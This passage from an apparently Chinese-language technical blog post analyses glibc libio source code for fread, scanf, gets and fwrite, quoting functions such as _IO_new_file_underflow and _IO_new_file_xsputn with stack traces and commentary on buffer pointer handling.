_IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数稍微做一些检查就会调用<code>_IO_UNDERFLOW</code>函数，其中一个检查是如果<code>fp-&gt;_IO_read_ptr</code>小于<code>fp-&gt;_IO_read_end</code>则表明输入缓冲区里存在数据，可直接返回，否则则表示需要继续读入数据。</p><p>检查都通过的话就会调用<code>_IO_UNDERFLOW</code>函数，该函数是FILE结构体vtable里的<code>_IO_new_file_underflow</code>，跟进去看，文件在<code>/libio/fileops.c</code>里：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_file_underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span></span><br><span class="line"><span class="comment"> required by any standard.  My recollection is that</span></span><br><span class="line"><span class="comment"> traditional Unix systems did this for stdout.  stderr better</span></span><br><span class="line"><span class="comment"> not be line buffered.  So we do just that here</span></span><br><span class="line"><span class="comment"> explicitly.  --drepper */</span></span><br><span class="line">      _IO_acquire_lock (<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))</span><br><span class="line">  == (_IO_LINKED | _IO_LINE_BUF))</span><br><span class="line">_IO_OVERFLOW (<span class="built_in">stdout</span>, EOF);</span><br><span class="line"></span><br><span class="line">      _IO_release_lock (<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This is very tricky. We have to adjust those</span></span><br><span class="line"><span class="comment">     pointers before we call _IO_SYSREAD () since</span></span><br><span class="line"><span class="comment">     we may longjump () out while waiting for</span></span><br><span class="line"><span class="comment">     input. Those pointers may be screwed up. H.J. */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;<span class="comment">//重置诸多缓存指针</span></span><br><span class="line"><span class="comment">//为什么要重置write指针,因为read和write用的是同一个缓冲区,如果不重置wirte的指针的话,那么调用write显然就会冲突</span></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<span class="comment">//最多读buf大小</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count;<span class="comment">//read_end指针拔高,这样退出该函数再次进入上层循环时就能直接从read_ptr指针处获得数据</span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If a stream is read to EOF, the calling application may switch active</span></span><br><span class="line"><span class="comment"> handles.  As a result, our offset cache would no longer be valid, so</span></span><br><span class="line"><span class="comment"> unset it.  */</span></span><br><span class="line">      fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个<code>_IO_new_file_underflow</code>函数，是最终调用系统调用的地方，在最终执行系统调用之前，仍然有一些检查，整个流程为：</p><ol><li>检查FILE结构体的<code>_flag</code>标志位是否包含<code>_IO_NO_READS</code>，如果存在这个标志位则直接返回<code>EOF</code>，其中<code>_IO_NO_READS</code>标志位的定义是<code>#define _IO_NO_READS 4 /* Reading not allowed */</code>。</li><li>如果<code>fp-&gt;_IO_buf_base</code>位null，则调用<code>_IO_doallocbuf</code>分配输入缓冲区。</li><li>接着初始化设置FILE结构体指针，将他们都设置成<code>fp-&gt;_IO_buf_base</code></li><li>调用<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数），该函数最终执行系统调用read，读取文件数据，数据读入到<code>fp-&gt;_IO_buf_base</code>中，读入大小为输入缓冲区的大小<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>。</li><li>设置输入缓冲区已有数据的size，即设置<code>fp-&gt;_IO_read_end</code>为<code>fp-&gt;_IO_read_end += count</code>。</li></ol><p>其中第二步里面的如果<code>fp-&gt;_IO_buf_base</code>位null，则调用<code>_IO_doallocbuf</code>分配输入缓冲区，似乎有点累赘，因为之前已经分配了，这个原因在最后会说明。</p><p>其中第四步的<code>_IO_SYSREAD</code>（vtable中的<code>_IO_file_read</code>函数）的源码比较简单，就是执行系统调用函数read去读取文件数据，文件在<code>libio/fileops.c</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line">_IO_file_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (__builtin_expect (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL, <span class="number">0</span>)</span><br><span class="line">  ? __read_nocancel (fp-&gt;_fileno, buf, size)</span><br><span class="line">  : __read (fp-&gt;_fileno, buf, size));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_file_underflow</code>函数执行完毕以后，FILE结构体中各个指针已被赋值，且文件数据已读入，输入缓冲区里已经有数据，</p><p>其中<code>fp-&gt;_IO_read_ptr</code>指向输入缓冲区数据的开始位置，<code>fp-&gt;_IO_read_end</code>指向输入缓冲区数据结束的位置：</p><p>函数执行完后，返回到<code>_IO_file_xsgetn</code>函数中，由于<code>while</code>循环的存在，重新执行第二部分，此时将输入缓冲区拷贝至目标缓冲区，最终返回。</p><p>至此，对于fread的源码分析结束。</p><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p>如果分配buf时出错,则执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>采用不使用缓冲区的方式读取</strong></p><h2 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">_IO_new_file_underflow at fileops.c</span><br><span class="line">__GI__IO_default_uflow at genops.c</span><br><span class="line">_IO_vfscanf_internal at vfscanf.c</span><br><span class="line">__isoc99_scanf at  at isoc99_scanf.c</span><br></pre></td></tr></table></figure><p>栈回溯</p><p>可以看到scanf最终是<strong>调用stdin的vtable中的<code>_IO_new_file_underflow</code>去调用read</strong>的。</p><p>不过它并不是使用<code>_IO_file_xsgetn</code>，而是使用vtable中的<code>__uflow</code>，源码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_default_uflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ch = _IO_UNDERFLOW (fp);</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr++;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_default_uflow)</span><br></pre></td></tr></table></figure><p><code>__uflow</code>函数基本上啥都没干直接就调用了<code>_IO_new_file_underflow</code>因此最终也是<code>_IO_new_file_underflow</code>实现的输入。</p><h2 id="gets"><a href="#gets" class="headerlink" title="gets"></a>gets</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">__GI__IO_file_underflow</span><br><span class="line">__GI__IO_default_uflow</span><br><span class="line">gets</span><br></pre></td></tr></table></figure><p>函数调用栈与scanf基本一致：</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>虽然不能说全部的io输入都是通过<code>_IO_new_file_underflow</code>函数最终实现的输入，但是应该也可以说大部分是使用<code>_IO_new_file_underflow</code>函数实现的。</p><p>但是仍然有一个问题，由于<code>__uflow</code>直接就调用了<code>_IO_new_file_underflow</code>函数，那么输入缓冲区是在哪里建立的呢</p><p>为了找到这个问题的答案，在程序进入到fscanf函数后又在<code>malloc</code>函数下了个断点，然后栈回溯：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span></span><br><span class="line">__GI__IO_file_doallocate</span><br><span class="line">__GI__IO_doallocbuf</span><br><span class="line">__GI__IO_file_underflow</span><br><span class="line">__GI__IO_default_uflow</span><br><span class="line">__GI__IO_vfscanf</span><br><span class="line">__isoc99_fscanf</span><br><span class="line">main</span><br><span class="line">__libc_start_main</span><br></pre></td></tr></table></figure><p>原来是在<code>__GI__IO_file_underflow</code>分配的空间，回到上面看该函数的源码，确实有一段判断输入缓冲区如果为空则调用<code>__GI__IO_doallocbuf</code>函数建立输入缓冲区的代码，这就解释了<code>__GI__IO_file_underflow</code>第二步中为啥还会有个输入缓冲区判断的原因了。</p><h1 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h1><p>有点复杂,写的乱了点,之后改</p><p>fwrite实际上是_IO_fwrite,位于libio/iofwrite.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>_IO_sputn是一个宏最终调用的是vtable中的_IO_file_xsputn,直接搜是找不到这个函数的定义,因为其实际上已被_IO_new_file_xsputn替代</p><p>_IO_new_file_xsputn位于libio/fileops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;</span><br><span class="line">  <span class="type">size_t</span> to_do = n;</span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First figure out how much space is available in the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;</span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)</span><br><span class="line">&#123;</span><br><span class="line">  count = new_do_write (f, s, do_write);</span><br><span class="line">  to_do -= count;</span><br><span class="line">  <span class="keyword">if</span> (count &lt; do_write)</span><br><span class="line">    <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment"> buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment"> so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)</span><br><span class="line">to_do -= _IO_default_xsputn (f, s+do_write, to_do);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到整体逻辑与fread几乎是一致的</p><h2 id="0x1-2"><a href="#0x1-2" class="headerlink" title="0x1"></a>0x1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">   &#123;</span><br><span class="line">     count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;</span><br><span class="line">     <span class="keyword">if</span> (count &gt;= n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">  <span class="keyword">for</span> (p = s + n; p &gt; s; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  count = p - s + <span class="number">1</span>;</span><br><span class="line">  must_flush = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">   count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br></pre></td></tr></table></figure><p>如果文件流属于行缓冲模式</p><p>则倒序搜索数据串中是否存在’\n’</p><p>存在则设置count和must_flush标志</p><p>如果不处于行缓冲模式则根据缓冲区中是否有数据设置count</p><h2 id="0x2-2"><a href="#0x2-2" class="headerlink" title="0x2"></a>0x2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (count &gt; to_do)</span><br><span class="line">count = to_do;</span><br><span class="line">     f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);</span><br><span class="line">     s += count;</span><br><span class="line">     to_do -= count;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>如果count&gt;0就先将已有的部分传递给文件流</p><h2 id="0x3-2"><a href="#0x3-2" class="headerlink" title="0x3"></a>0x3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)</span><br><span class="line"><span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">   caller that everything has been written.  */</span></span><br><span class="line"><span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = 